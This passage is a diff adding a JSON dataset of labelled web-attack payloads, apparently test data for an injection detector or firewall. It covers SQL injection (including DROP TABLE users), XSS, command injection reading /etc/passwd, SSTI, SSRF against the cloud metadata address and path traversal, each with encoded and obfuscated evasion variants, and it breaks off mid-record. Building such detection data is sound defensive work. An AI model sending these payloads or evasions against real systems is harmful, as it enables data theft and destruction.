@@ -1,0 +1,1122 @@
+[
+  {
+    "id": "sqli_orig",
+    "payload": "' UNION SELECT 1,2,3--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "sqli_obf_url_encode_full",
+    "payload": "%27 %55%4E%49%4F%4E %53%45%4C%45%43%54 %31%2C%32%2C%33%2D%2D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_html_entity_encode",
+    "payload": "&#39; UNION SELECT 1,2,3--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_base64_encode",
+    "payload": "JyBVTklPTiBTRUxFQ1QgMSwyLDMtLQ",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_url_encode_double",
+    "payload": "%2527 %2555%254E%2549%254F%254E %2553%2545%254C%2545%2543%2554 %2531%252C%2532%252C%2533%252D%252D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_hex_encode",
+    "payload": "2720554e494f4e2053454c45435420312c322c332d2d",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_sql_comment_insert",
+    "payload": "' UNI/**/ON SEL/**_**/ECT 1,2,3--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_case_randomize",
+    "payload": "' UniON SeLect 1,2,3--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_8",
+    "payload": "%2527 %2555%254E%2549%254F%254E %2553%2545%254C%2545%2543%2554 %2531%252C%2532%252C%2533%252D%252D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_9",
+    "payload": "JyBVTklPTiBTRUxFQ1QgMSwyLDMtLQ==",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_10",
+    "payload": "2720554e494f4e2053454c45435420312c322c332d2d",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_orig",
+    "payload": "' OR 1=1--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "sqli_obf_url_encode_full",
+    "payload": "%27 %4F%52 %31%3D%31%2D%2D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_html_entity_encode",
+    "payload": "&#39; OR 1=1--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_base64_encode",
+    "payload": "JyBPUiAxPTEtLQ==",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_url_encode_double",
+    "payload": "%2527 %254F%2552 %2531%253D%2531%252D%252D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_hex_encode",
+    "payload": "27204f5220313d312d2d",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_whitespace_fill",
+    "payload": "' OR 1\t=1  -- \t",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_case_randomize",
+    "payload": "' or 1=1--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_19",
+    "payload": "%2527 %254F%2552 %2531%253D%2531%252D%252D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_20",
+    "payload": "%2527 %254F%2552 %2531%253D%2531%252D%252D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_21",
+    "payload": "262333393b204f7220313d312d2d",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_orig",
+    "payload": "sleep(1.1)",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "sqli_obf_url_encode_full",
+    "payload": "%73%6C%65%65%70%28%31%2E%31%29",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_base64_encode",
+    "payload": "c2xlZXAoMS4xKQ==",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_url_encode_double",
+    "payload": "%2573%256C%2565%2565%2570%2528%2531%252E%2531%2529",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_hex_encode",
+    "payload": "736c65657028312e3129",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_case_randomize",
+    "payload": "SLEEP(1.1)",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_28",
+    "payload": "c2xlZXAoMS4xICk",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_29",
+    "payload": "736c656570202028312e3129",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_30",
+    "payload": "%37%33%36%63%36%35%36%35%37%30%32%38%33%31%32%45%33%31%32%39",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_orig",
+    "payload": "'; DROP TABLE users;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "sqli_obf_url_encode_full",
+    "payload": "%27%3B %44%52%4F%50 %54%41%42%4C%45 %75%73%65%72%73%3B%2D%2D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_html_entity_encode",
+    "payload": "&#39;; DROP TABLE users;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_base64_encode",
+    "payload": "JzsgRFJPUCBUQUJMRSB1c2VyczstLQ==",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_url_encode_double",
+    "payload": "%2527%253B %2544%2552%254F%2550 %2554%2541%2542%254C%2545 %2575%2573%2565%2572%2573%253B%252D%252D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_hex_encode",
+    "payload": "273b2044524f50205441424c452075736572733b2d2d",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_sql_comment_insert",
+    "payload": "'; DR/**/OP TABLE users;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_whitespace_fill",
+    "payload": "'\t; DROP TABLE users;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_obf_case_randomize",
+    "payload": "'; droP TaBLe uSeRS;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_40",
+    "payload": "%27%3B %44%52%4F%70 %74%41%42%6C%65 %55%73%65%52%53%3B%2D%2D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_41",
+    "payload": "4a7a736772466a507563627571756a4d7273623143327659435a73746c713d3d",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "sqli_combo_42",
+    "payload": "%26%23%33%39%3B  %3B %44%52%4F%50 %54%41%42%4C%45 %75%73%65%72%73%3B  %2D%2D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_orig",
+    "payload": "<script>alert(1)</script>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "xss_obf_url_encode_full",
+    "payload": "%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_html_entity_encode",
+    "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_base64_encode",
+    "payload": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_url_encode_double",
+    "payload": "%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_hex_encode",
+    "payload": "3c7363726970743e616c6572742831293c2f7363726970743e",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_case_randomize",
+    "payload": "<SCRIPT>aLerT(1)</sCRIpT>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_combo_50",
+    "payload": "%253C%2573%2563%2552%2549%2550%2574%253E%2561%254C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2543%2552%2549%2550%2574%253E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_combo_51",
+    "payload": "%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_combo_52",
+    "payload": "3c7343524970543e416c4572542831293c2f5343526950543e",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_orig",
+    "payload": "<img src=x onerror=alert(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "xss_obf_url_encode_full",
+    "payload": "%3C%69%6D%67 %73%72%63%3D%78 %6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%31%29%3E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_html_entity_encode",
+    "payload": "&lt;img src=x onerror=alert(1)&gt;",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_base64_encode",
+    "payload": "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_url_encode_double",
+    "payload": "%253C%2569%256D%2567 %2573%2572%2563%253D%2578 %256F%256E%2565%2572%2572%256F%2572%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_hex_encode",
+    "payload": "3c696d67207372633d78206f6e6572726f723d616c6572742831293e",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_whitespace_fill",
+    "payload": "<img src=x onerror  =alert(\n1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_case_randomize",
+    "payload": "<imG sRC=X ONERROR=ALerT(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_combo_61",
+    "payload": "%33%63%36%39%36%64%36%37%32%30%37%33%37%32%36%33%33%64%37%38%32%30%36%66%36%65%36%35%37%32%37%32%36%66%37%32%33%64%36%31%36%63%36%35%37%32%37%34%32%38%33%31%32%39%33%65",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_combo_62",
+    "payload": "%26%6C%74%3B%69%6D%67 %73%72%63%3D%78 %6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%31%29%26%67%74%3B",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_combo_63",
+    "payload": "70474c545a79625a434d4d3965634256424d7679634d3979707766535a584a304b64655050673d3d",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_orig",
+    "payload": "<svg onload=alert(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "xss_obf_url_encode_full",
+    "payload": "%3C%73%76%67 %6F%6E%6C%6F%61%64%3D%61%6C%65%72%74%28%31%29%3E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_html_entity_encode",
+    "payload": "&lt;svg onload=alert(1)&gt;",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_base64_encode",
+    "payload": "PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_url_encode_double",
+    "payload": "%253C%2573%2576%2567 %256F%256E%256C%256F%2561%2564%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_hex_encode",
+    "payload": "3c737667206f6e6c6f61643d616c6572742831293e",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_whitespace_fill",
+    "payload": "<svg onload\t=alert(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_obf_case_randomize",
+    "payload": "<sVg OnloaD=aLerT(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_combo_72",
+    "payload": "PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_combo_73",
+    "payload": "PHN2ZyBvbmxvYWQgPWFsZXJ0KDEgCSk-",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xss_combo_74",
+    "payload": "JTNDJTczJTc2JTY3ICU2RiU2RSU2QyU2RiU2MSU2NCUzRCU2MSU2QyU2NSU3MiU3NCUyOCUzMSUyOSUzRQ==",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_orig",
+    "payload": "| cat /etc/passwd",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "cmdi_obf_url_encode_full",
+    "payload": "%7C %63%61%74 %2F%65%74%63%2F%70%61%73%73%77%64",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_obf_base64_encode",
+    "payload": "fCBjYXQgL2V0Yy9wYXNzd2Q",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_obf_url_encode_double",
+    "payload": "%257C %2563%2561%2574 %252F%2565%2574%2563%252F%2570%2561%2573%2573%2577%2564",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_obf_hex_encode",
+    "payload": "7c20636174202f6574632f706173737764",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_obf_case_randomize",
+    "payload": "| CaT /eTc/PASSwd",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_combo_81",
+    "payload": "%4A%74%49%31%6E%30%4D%47%4A%74%69%31%4E%4A%4D%4C%6D%4A%55%32%6D%73%55%79%6E%74%63%30%69%43%55%79%4E%74%4A%47%6A%54%69%31%6E%6A%75%4C%4D%6A%55%33%6E%43%75%79%6E%74%79%7A%4A%54%49%31%4D%4B%59%6C%6D%4A%55%33%6D%63%75%59%6E%74%59%58%4A%54%69%31%4E%5A%6D%6C%6D%6A%55%33%6D%79%75%59%6E%54%43%33%6A%54%69%31%6E%4A%71%3D",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_combo_82",
+    "payload": "%257C %2563%2561%2574 %252F%2565%2574%2563%252F%2570%2561%2573%2573%2577%2564",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_combo_83",
+    "payload": "%2537%2563%2532%2530%2536%2533%2536%2531%2537%2534%2532%2530%2532%2566%2536%2535%2537%2534%2536%2533%2532%2566%2537%2530%2536%2531%2537%2533%2537%2533%2537%2537%2536%2534",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_orig",
+    "payload": "; ls -la",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "cmdi_obf_url_encode_full",
+    "payload": "%3B %6C%73 %2D%6C%61",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_obf_base64_encode",
+    "payload": "OyBscyAtbGE",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_obf_url_encode_double",
+    "payload": "%253B %256C%2573 %252D%256C%2561",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_obf_hex_encode",
+    "payload": "3b206c73202d6c61",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_obf_whitespace_fill",
+    "payload": "; ls  \t-la",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_obf_case_randomize",
+    "payload": "; lS -lA",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_combo_91",
+    "payload": "JTNCICU2QyU3MyAlMkQlNkMlNjE=",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_combo_92",
+    "payload": "%253b %256c%2573 %252d%256C%2561",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "cmdi_combo_93",
+    "payload": "%254F%2579%2542%2573%2563%2579%2541%2574%2562%2547%2545%253D",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssti_orig",
+    "payload": "{{7*7}}",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "original"
+  },
+  {
+    "id": "ssti_obf_url_encode_full",
+    "payload": "%7B%7B%37%2A%37%7D%7D",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssti_obf_base64_encode",
+    "payload": "e3s3Kjd9fQ==",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssti_obf_url_encode_double",
+    "payload": "%257B%257B%2537%252A%2537%257D%257D",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssti_obf_hex_encode",
+    "payload": "7b7b372a377d7d",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssti_obf_whitespace_fill",
+    "payload": "{  {7*7}  }\n",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssti_combo_100",
+    "payload": "%257B%257B%2537%252A%2537%257D%257D",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssti_combo_101",
+    "payload": "  %257B%257B %2537%252A%2537%257D%257D",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssrf_orig",
+    "payload": "http://169.254.169.254/latest/meta-data/",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "ssrf_obf_url_encode_full",
+    "payload": "%68%74%74%70%3A%2F%2F%31%36%39%2E%32%35%34%2E%31%36%39%2E%32%35%34%2F%6C%61%74%65%73%74%2F%6D%65%74%61%2D%64%61%74%61%2F",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssrf_obf_base64_encode",
+    "payload": "aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssrf_obf_url_encode_double",
+    "payload": "%2568%2574%2574%2570%253A%252F%252F%2531%2536%2539%252E%2532%2535%2534%252E%2531%2536%2539%252E%2532%2535%2534%252F%256C%2561%2574%2565%2573%2574%252F%256D%2565%2574%2561%252D%2564%2561%2574%2561%252F",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssrf_obf_hex_encode",
+    "payload": "687474703a2f2f3136392e3235342e3136392e3235342f6c61746573742f6d6574612d646174612f",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssrf_obf_case_randomize",
+    "payload": "htTP://169.254.169.254/LAtESt/mEta-DatA/",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssrf_combo_108",
+    "payload": "687474703a2f2F3136392e3235342E3136392e3235342f6C61746573742f6d6574612d646174612F",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssrf_combo_109",
+    "payload": "%2534%2561%2535%2534%2535%2539%2533%2534%2534%2561%2535%2534%2536%2533%2533%2530%2534%2561%2535%2534%2536%2533%2533%2530%2534%2561%2535%2534%2536%2533%2537%2537%2534%2561%2535%2534%2534%2565%2534%2532%2534%2561%2535%2534%2534%2561%2534%2537%2534%2561%2535%2534%2534%2561%2534%2537%2534%2561%2535%2534%2534%2564%2537%2538%2534%2561%2535%2534%2534%2564%2533%2532%2534%2561%2535%2534%2534%2564%2533%2535%2534%2561%2535%2534%2534%2561%2534%2536%2534%2561%2535%2534%2534%2564%2537%2539%2534%2561%2535%2534%2534%2564%2533%2531%2534%2561%2535%2534%2534%2564%2533%2530%2534%2561%2535%2534%2534%2561%2534%2536%2534%2561%2535%2534%2534%2564%2537%2538%2534%2561%2535%2534%2534%2564%2533%2532%2534%2561%2535%2534%2534%2564%2533%2535%2534%2561%2535%2534%2534%2561%2534%2536%2534%2561%2535%2534%2534%2564%2537%2539%2534%2561%2535%2534%2534%2564%2533%2531%2534%2561%2535%2534%2534%2564%2533%2530%2534%2561%2535%2534%2534%2561%2534%2537%2534%2561%2535%2534%2535%2561%2534%2534%2534%2561%2535%2534%2535%2539%2537%2538%2534%2561%2535%2534%2536%2533%2533%2530%2534%2561%2535%2534%2535%2539%2533%2531%2534%2561%2535%2534%2536%2533%2537%2561%2534%2561%2535%2534%2536%2533%2533%2530%2534%2561%2535%2534%2534%2561%2534%2537%2534%2561%2535%2534%2535%2561%2534%2535%2534%2561%2535%2534%2535%2539%2533%2531%2534%2561%2535%2534%2536%2533%2533%2530%2534%2561%2535%2534%2535%2539%2537%2538%2534%2561%2535%2534%2534%2561%2534%2535%2534%2561%2535%2534%2535%2539%2533%2530%2534%2561%2535%2534%2535%2539%2537%2538%2534%2561%2535%2534%2536%2533%2533%2530%2534%2561%2535%2534%2535%2539%2537%2538%2534%2561%2535%2534%2534%2561%2534%2537",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ssrf_combo_110",
+    "payload": "%2525%2536%2538%2525%2537%2534%2525%2537%2534%2525%2537%2530%2525%2533%2541%2525%2532%2546%2525%2532%2546%2525%2533%2531%2525%2533%2536%2525%2533%2539%2525%2532%2545%2525%2533%2532%2525%2533%2535%2525%2533%2534%2525%2532%2545%2525%2533%2531%2525%2533%2536%2525%2533%2539%2525%2532%2545%2525%2533%2532%2525%2533%2535%2525%2533%2534%2525%2532%2546%2525%2536%2543%2525%2536%2531%2525%2537%2534%2525%2536%2535%2525%2537%2533%2525%2537%2534%2525%2532%2546%2525%2536%2544%2525%2536%2535%2525%2537%2534%2525%2536%2531%2525%2532%2544%2525%2536%2534%2525%2536%2531%2525%2537%2534%2525%2536%2531%2525%2532%2546",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ptrav_orig",
+    "payload": "../../etc/passwd",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "ptrav_obf_url_encode_full",
+    "payload": "%2E%2E%2F%2E%2E%2F%65%74%63%2F%70%61%73%73%77%64",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ptrav_obf_base64_encode",
+    "payload": "Li4vLi4vZXRjL3Bhc3N3ZA==",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ptrav_obf_url_encode_double",
+    "payload": "%252E%252E%252F%252E%252E%252F%2565%2574%2563%252F%2570%2561%2573%2573%2577%2564",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ptrav_obf_hex_encode",
+    "payload": "2e2e2f2e2e2f6574632f706173737764",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ptrav_obf_case_randomize",
+    "payload": "../../EtC/PASswd",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ptrav_combo_117",
+    "payload": "%252E%252E%252F%252E%252E%252F%2545%2554%2543%252F%2570%2541%2553%2573%2557%2564",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ptrav_combo_118",
